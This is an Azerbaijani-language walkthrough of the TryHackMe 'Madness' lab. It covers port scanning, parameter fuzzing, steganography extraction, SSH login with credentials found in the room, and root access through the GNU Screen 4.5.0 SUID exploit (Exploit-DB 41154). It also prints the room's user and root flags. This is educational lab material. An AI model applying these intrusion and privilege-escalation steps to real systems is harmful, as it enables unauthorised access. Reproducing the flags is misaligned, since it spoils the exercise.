# 🚩 TryHackMe – Madness CTF | Azərbaycanca Write-up

> **Room:** [madness](https://tryhackme.com/room/madness)  
> **Çətinlik:** Asan  
> **Kateqoriya:** Steganography, Web Enumeration, ROT13, SUID Exploit  
> **Məqsəd:** User flag və Root flag əldə etmək

---

## 📖 Ümumi Baxış

Bu CTF tapşırığında bir neçə texnika ardıcıl istifadə edilir:
- Zədəli şəkil başlığını düzəltmək
- Gizli qovluq tapmaq
- Parameter fuzzing
- Steganography (şəkil içinə gizlənmiş məlumat)
- ROT13 şifrəsini açmaq
- SUID binary ilə privilege escalation

### Hücum Zənciri:
```
Nmap skan
    ↓
Port 80 → Apache default səhifəsi
    ↓
Mənbə kodu → thm.jpg şəkili + gizli şərh
    ↓
thm.jpg başlığını düzəlt (JPG magic bytes) → /th1s_1s_h1dd3n qovluğu
    ↓
/th1s_1s_h1dd3n → ?secret=FUZZ → secret=73 → passphrase: y2RPJ4QaPF!B
    ↓
steghide + passphrase → hidden.txt → username: wbxre (ROT13 → joker)
    ↓
CTF room şəkili → steghide → password.txt → *axA&GF8dP
    ↓
SSH: joker:*axA&GF8dP → user flag
    ↓
SUID: /bin/screen-4.5.0 → Exploit-DB 41154 → root flag 🏆
```

---

## 🔎 Mərhələ 1: Nmap ilə Port Skan

### Nmap nədir?
**Nmap** — şəbəkədə açıq portları və işləyən xidmətləri aşkar edən kəşfiyyat alətidir. Hər CTF-in ilk addımı budur.

### Əmr:
```bash
nmap -sV <HEDEF-IP>
```

### Parametrin izahı:
| Parametr | Nə edir? |
|----------|----------|
| `-sV` | Xidmət versiyalarını tap |

### Nəticə:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18
```

**Nə öyrəndik?**
- Port **22** — SSH (uzaqdan terminal bağlantısı)
- Port **80** — HTTP veb server (Apache)

Yalnız 2 port açıqdır — bütün hücum səthi veb serverdədir. Hər şeyi diqqətlə araşdırmaq lazımdır.

---

## 🌐 Mərhələ 2: Veb Səhifənin Mənbə Koduna Baxış

`http://<HEDEF-IP>` ünvanında Apache2 Ubuntu Default Page görünür. Adi görünür — amma mənbə kodunda (`Ctrl+U`) gizli ipucu var:

```html
<img src="thm.jpg" class="floating_element"/>
<!-- They will never find me-->
```

**İki mühüm tapıntı:**
1. `thm.jpg` — bir şəkil faylı var
2. `<!-- They will never find me-->` — developer gizli bir şey qoyub!

---

## 🖼️ Mərhələ 3: thm.jpg Şəkilinin Analizi — Zədəli Başlıq

### Şəkili endir:
```bash
wget http://<HEDEF-IP>/thm.jpg
file thm.jpg
```

**Nəticə:** `thm.jpg: data` — fayl tanınmır!

### xxd ilə başlığa bax:
```bash
xxd thm.jpg | head -3
```

**Nəticə:**
```
00000000: 8950 4e47 0d0a 1a0a ...  .PNG........
```

**Problem:** Fayl `.jpg` uzantısına malikdir amma içi **PNG magic bytes** ilə başlayır! Bu qəsdən edilib — şəkil başlığı zədələnib/dəyişdirilib.

### Magic Bytes nədir?
Hər fayl formatının əvvəlində xüsusi baytlar (imza) olur. Bu baytlara "magic bytes" deyilir — fayl növünü müəyyən edir:

| Format | Magic Bytes (HEX) |
|--------|------------------|
| JPG | `FF D8 FF E0` |
| PNG | `89 50 4E 47` |
| PDF | `25 50 44 46` |

Bizdə PNG magic bytes var amma JPG olmalıdır — bunu düzəltmək lazımdır.

### hexedit ilə başlığı düzəlt:
```bash
hexedit thm.jpg
```

**hexedit nədir?** — Faylın içini bayt-bayt redaktə etməyə imkan verən alətdir.

Açıldıqdan sonra ilk baytları dəyiş:
```
Köhnə (PNG): 89 50 4E 47 0D 0A 1A 0A
Yeni  (JPG): FF D8 FF E0 00 10 4A 46
```

`Ctrl+X` ilə saxla və çıx.

### Düzəldilmiş şəkili aç:
```bash
eog thm.jpg
# və ya
xdg-open thm.jpg
```

**Şəkildə görünür:** `/th1s_1s_h1dd3n`

🎯 **Gizli qovluq tapıldı!**

---

## 🔢 Mərhələ 4: Gizli Qovluq və Parameter Fuzzing

### Qovluğa daxil ol:
```bash
firefox http://<HEDEF-IP>/th1s_1s_h1dd3n/
```

Mənbə kodunda yeni ipucu:
```html
<!-- It's between 0-99 but I don't think anyone will look here-->
```

**Bu nə deməkdir?** — `secret` adlı bir URL parametri var və dəyəri 0-99 arasındadır.

URL belə görünür: `http://<HEDEF-IP>/th1s_1s_h1dd3n/?secret=???`

### ffuf ilə fuzzing:

**ffuf nədir?** — URL parametrlərini, qovluqları və dəyərləri avtomatik sınayan bir fuzzing alətidir. Biz 0-dan 99-a qədər bütün rəqəmləri avtomatik sınayacağıq.

```bash
# 0-99 arası rəqəmlər siyahısı yarat
seq 0 99 > numbers.txt

# ffuf ilə fuzz et
ffuf -w numbers.txt -u http://<HEDEF-IP>/th1s_1s_h1dd3n/?secret=FUZZ
```

### Parametrlərin izahı:
| Parametr | Nə edir? |
|----------|----------|
| `-w numbers.txt` | Wordlist (siyahı faylı) |
| `-u URL` | Hədəf URL — FUZZ sözü dəyişdiriləcək yer |

### Nəticə:
`secret=73` digərlərindən fərqli cavab ölçüsü qaytardı → bu düzgün dəyərdir!

### Brauzerdə yoxla:
```
http://<HEDEF-IP>/th1s_1s_h1dd3n/?secret=73
```

**Nəticə:**
```
Secret Entered: 73
Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B
```

🎯 **Passphrase tapıldı: `y2RPJ4QaPF!B`**

---

## 🔐 Mərhələ 5: Steganography — thm.jpg-dən Username Çıxarmaq

### Steganography nədir?
**Steganography** — məlumatı başqa bir faylın (şəkil, audio, video) içinə gizlətmək texnikasıdır. Şəkil normal görünür amma içində gizli məlumat var.

**steghide** — şəkil fayllarına (JPG, BMP) məlumat gizlədən/çıxaran bir alətdir.

### Əmr:
```bash
steghide extract -sf thm.jpg
# Passphrase sorulanda: y2RPJ4QaPF!B
```

### Parametrlərin izahı:
| Parametr | Nə edir? |
|----------|----------|
| `extract` | Gizli faylı çıxar |
| `-sf thm.jpg` | Mənbə fayl |

**Nəticə:** `hidden.txt` faylı çıxarıldı:
```
Here's a username : wbxre
```

### ROT13 nədir?
`wbxre` — bu birbaşa oxunaqlı deyil, **ROT13** şifrəsi ilə şifrələnib.

**ROT13** — hərfləri əlifbada 13 mövqe irəli sürüşdürən sadə şifrədir. Məsələn:
```
a → n
b → o
w → j
b → o
x → k
r → e
e → r
```

```
wbxre → joker
```

**Deşifrə etmək üçün:**
```bash
echo "wbxre" | tr 'a-zA-Z' 'n-za-mN-ZA-M'
# Nəticə: joker
```

🎯 **İstifadəçi adı: `joker`**

---

## 🔑 Mərhələ 6: İkinci Şəkildən Şifrə Çıxarmaq

TryHackMe-nin Madness otağının əsas şəkilini (CTF room cover image) endir. Bu şəkildə də steghide ilə gizlənmiş məlumat var.

### Şəkili endir:
```bash
wget https://i.imgur.com/5iW7kC8.jpg
# və ya TryHackMe room səhifəsindən əsas şəkili endir
```

### Steghide ilə yoxla (şifrəsiz):
```bash
steghide extract -sf 5iW7kC8.jpg
# Passphrase sorulanda: boş burax (Enter bas)
```

**Nəticə:** `password.txt` faylı çıxarıldı:
```
*axA&GF8dP
```

🎯 **Şifrə: `*axA&GF8dP`**

---

## 🔐 Mərhələ 7: SSH ilə Daxil Olmaq

İndi bizdə var:
- **İstifadəçi adı:** `joker`
- **Şifrə:** `*axA&GF8dP`

```bash
ssh joker@<HEDEF-IP>
# Şifrə: *axA&GF8dP
```

Sistemə uğurla daxil olduq! ✅

---

## 📜 Mərhələ 8: User Flag

```bash
ls
cat user.txt
```

**User Flag:**
```
THM{d5781e53b130efe2f94f9b0354a5e4ea}
```

✅ **User flag alındı!**

---

## 🧪 Mərhələ 9: SUID Binary Axtarışı

### SUID nədir?
**SUID (Set User ID)** — bir faylın sahibinin hüquqları ilə (məsələn, root) işlədilməsinə imkan verən xüsusi bir Linux icazəsidir. Əgər köhnə/zəif bir proqramın SUID biti varsa, bunu root almaq üçün istifadə etmək olar.

### SUID faylları axtar:
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

### Parametrlərin izahı:
| Parametr | Nə edir? |
|----------|----------|
| `find /` | Kök qovluqdan axtar |
| `-type f` | Yalnız faylları tap |
| `-perm -04000` | SUID biti olan faylları tap |
| `2>/dev/null` | Xəta mesajlarını gizlət |

### Nəticə:
```
/bin/screen-4.5.0
```

**`screen 4.5.0`** — bu **kritik** tapıntıdır!

---

## ⚡ Mərhələ 10: Privilege Escalation — Screen 4.5.0 Exploit

### GNU Screen nədir?
**GNU Screen** — terminal multiplexer proqramıdır (bir terminalda bir neçə session açmaq üçün). Versiya 4.5.0-da **kritik local privilege escalation zəifliyi** var.

| Xüsusiyyət | Dəyər |
|-----------|-------|
| Proqram | GNU Screen 4.5.0 |
| Zəiflik növü | Local Privilege Escalation |
| Exploit-DB | [#41154](https://www.exploit-db.com/exploits/41154) |

### Exploit skriptini al:
```bash
# Exploit-DB-dən skripti tap
searchsploit screen 4.5.0

# Skripti kopyala
searchsploit -m 41154
```

### Skripti işlət:
```bash
bash 41154.sh
```

**Nəticə:** Root shell açıldı!

```
root@ubuntu:~#
whoami
root
```

✅ **Root oldun! 🏆**

---

## 👑 Mərhələ 11: Root Flag

```bash
cat /root/root.txt
```

**Root Flag:**
```
THM{5ecd98aa66a6abb670184d7547c8124a}
```

✅ **Sistem tam ələ keçirildi!**

---

## ✅ Xülasə Cədvəli

| Mərhələ | Alət | Tapıntı |
|---------|------|---------|
| Port Skan | Nmap | 22 (SSH), 80 (HTTP) |
| Mənbə Kodu | Brauzer | thm.jpg + gizli şərh |
| Fayl Analizi | xxd, file | PNG magic bytes JPG-də |
| Başlıq Düzəltmə | hexedit | JPG başlığı bərpa edildi |
| Gizli Qovluq | Şəkil | `/th1s_1s_h1dd3n` tapıldı |
| Parameter Fuzzing | ffuf | `secret=73` → `y2RPJ4QaPF!B` |
| Steganography 1 | steghide | `hidden.txt` → `wbxre` |
| ROT13 Decode | tr əmri | `wbxre` → `joker` |
| Steganography 2 | steghide | `password.txt` → `*axA&GF8dP` |
| SSH Girişi | SSH | `joker` kimi daxil olundu |
| User Flag | cat | `THM{d5781e53b130efe2f94f9b0354a5e4ea}` |
| SUID Axtarışı | find | `/bin/screen-4.5.0` tapıldı |
| Privilege Escalation | Exploit-DB 41154 | Root shell alındı |
| Root Flag | cat | `THM{5ecd98aa66a6abb670184d7547c8124a}` |

---

## 🎓 Öyrənilən Dərslər

1. **Mənbə kodunu həmişə oxu** — developer şərhləri çox vaxt gizli qovluqlar, istifadəçi adları haqqında ipucu verir
2. **Şəkil başlıqlarını yoxla** — `file` əmri ilə faylın əsl formatını öyrən; CTF-lərdə başlıqlar qəsdən dəyişdirilir
3. **Magic bytes vacibdir** — hər fayl formatının xüsusi imzası var; yanlış magic bytes faylı "görünməz" edir
4. **Parameter fuzzing vacibdir** — yalnız qovluqları deyil, URL parametrlərini də fuzz et
5. **Steganography çoxqatlı ola bilər** — birdən çox şəkildə gizli məlumat ola bilər
6. **ROT13 çox yayılmışdır** — CTF-də oxunmaz mətn görəndə ROT13 ilk cəhd etməli olduğun şifrədir
7. **SUID binary-ləri həmişə yoxla** — `find / -perm -04000` əmrini unutma; köhnə versiyalar = public exploit
8. **GTFOBins + Exploit-DB** — SUID/sudo tapanda bu iki saytı yoxla

---

## 🔗 Faydalı Linklər

- [TryHackMe – Madness Room](https://tryhackme.com/room/madness)
- [Exploit-DB – Screen 4.5.0](https://www.exploit-db.com/exploits/41154)
- [GTFOBins](https://gtfobins.github.io)
- [CyberChef – ROT13](https://gchq.github.io/CyberChef/)
- [steghide rəsmi sayt](http://steghide.sourceforge.net/)

---

*Yazıldı: 2026 | Platforma: TryHackMe | Azərbaycanca*
